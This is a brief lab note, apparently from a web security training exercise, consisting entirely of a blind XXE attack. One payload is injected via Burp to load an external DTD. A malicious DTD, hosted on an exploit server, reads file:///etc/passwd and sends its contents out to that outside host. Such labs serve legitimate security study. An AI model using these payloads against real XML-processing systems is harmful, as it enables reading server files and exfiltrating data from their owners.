In Burp:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"<https://exploit-0a41009803a8ea33c00e262901da0065.exploit-server.net/exploit.dtd>"> %xxe;]>
```

In Exploit Server:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a41009803a8ea33c00e262901da0065.exploit-server.net/exploit?x=%file;'>">
%eval;
%exfil;
```
